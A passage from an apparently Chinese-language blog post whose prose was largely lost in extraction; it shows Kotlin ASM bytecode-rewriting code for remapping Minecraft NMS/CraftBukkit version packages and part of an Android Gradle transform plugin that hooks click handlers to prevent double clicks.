class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classVisitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> classVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> FieldVisitor <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">></span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span>fieldVisitor<span class=\"token operator\">:</span> FieldVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">FieldVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> fieldVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">val</span> nms <span class=\"token operator\">=</span> <span class=\"token string\">\"net/minecraft/server/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> obc <span class=\"token operator\">=</span> <span class=\"token string\">\"org/bukkit/craftbukkit/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>version<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>nms<span class=\"token punctuation\">,</span> <span class=\"token string\">\"net/minecraft/server/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>obc<span class=\"token punctuation\">,</span> <span class=\"token string\">\"org/bukkit/craftbukkit/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">></span> <span class=\"token function\">createProxyClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> VersionControlClassVisitor<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">getResourceAsStream</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">,</span> <span class=\"token string\">\"v1_16_R3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> MyClassLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">,</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">></span> <span class=\"token function\">createProxyInstance</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> createProxyClass<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> proxy <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    proxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>execute successfully v1.16</code>,</p>\n<p>gradleshadowJar(relocate)</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>asm</p>\n<p>hook</p>\n<p></p>\n<p>: <a href=\"https://github.com/leavesCZY/ASM_Transform\">leavesCZY&#x2F;ASM_Transform: ASM Transform  (github.com)</a></p>\n<p>android<code>transform api</code>gradle<em><strong>GradleTransformAction</strong></em>transform api</p>\n<h6 id=\"gradle\"><a href=\"#gradle\" class=\"headerlink\" title=\"gradle\"></a>gradle</h6><blockquote>\n<p>gradle</p>\n<p></p>\n</blockquote>\n<p><code>buildSrc</code><code>buildSrc</code>build.gradle</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */</span>\n<span class=\"token keyword\">class</span> DoubleClickPlugin <span class=\"token operator\">:</span> Plugin<span class=\"token operator\">&lt;</span>Project<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>project<span class=\"token operator\">:</span> Project<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> config <span class=\"token operator\">=</span> <span class=\"token function\">DoubleClickConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> appExtension<span class=\"token operator\">:</span> AppExtension <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>extensions<span class=\"token punctuation\">.</span><span class=\"token function\">getByType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        appExtension<span class=\"token punctuation\">.</span><span class=\"token function\">registerTransform</span><span class=\"token punctuation\">(</span><span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>applyapplyTransformTransform</p>\n<p>apply</p>\n<pre class=\"line-numbers language-groovy\" data-language=\"groovy\"><code class=\"language-groovy\"><span class=\"token keyword\">import</span> github<span class=\"token punctuation\">.</span>leavesczy<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span>doubleClick<span class=\"token punctuation\">.</span>DoubleClickPlugin\n\napply plugin<span class=\"token punctuation\">:</span> DoubleClickPlugin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"transform\"><a href=\"#transform\" class=\"headerlink\" title=\"transform\"></a>transform</h6><p><code>DoubleClickTransform</code></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">DoubleClickTransform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">BaseTransform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ViewDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"Landroid/view/View;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OnClickViewMethodDescriptor <span class=\"token operator\">=</span> <span class=\"token string\">\"(Landroid/view/View;)V\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> ButterKnifeOnClickAnnotationDesc <span class=\"token operator\">=</span> <span class=\"token string\">\"Lbutterknife/OnClick;\"</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> MethodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token operator\">:</span> Boolean\n            <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> desc <span class=\"token operator\">==</span> OnClickViewMethodDescriptor\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatCheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token operator\">:</span> DoubleClickConfig<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>formatUncheckViewOnClickAnnotation<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> MethodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">hasAnnotation</span><span class=\"token punctuation\">(</span>ButterKnifeOnClickAnnotationDesc<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">modifyClass</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ByteArray <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>byteArray<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassNode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span>EXPAND_FRAMES<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> methods <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>methods<span class=\"token punctuation\">.</span><span class=\"token function\">isNullOrEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> shouldHookMethodList <span class=\"token operator\">=</span> mutableSetOf<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// UncheckViewOnClick </span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>isStatic <span class=\"token operator\">||</span>\n                    methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasUncheckViewOnClickAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span>onlyOneViewParameter<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasCheckViewAnnotation</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token comment\">// CheckViewOnClick </span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">hasButterKnifeOnClickAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token comment\">// ButterKnife method  OnClick </span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">continue</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">.</span><span class=\"token function\">isHookPoint</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">,</span> methodNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token comment\">// lambda </span>\n                <span class=\"token keyword\">val</span> invokeDynamicInsnNodes <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span><span class=\"token function\">findHookPointLambda</span><span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">)</span>\n                invokeDynamicInsnNodes<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">val</span> handle <span class=\"token operator\">=</span> it<span class=\"token punctuation\">.</span>bsmArgs<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span><span class=\"token operator\">?</span> Handle\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>handle <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> handle<span class=\"token punctuation\">.</span>desc<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>methodNode <span class=\"token keyword\">in</span> methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">val</span> methodNameWithDesc <span class=\"token operator\">=</span> methodNode<span class=\"token punctuation\">.</span>nameWithDesc\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>shouldHookMethodList<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>methodNameWithDesc<span class=\"token punctuation\">)</span><span class=\"token 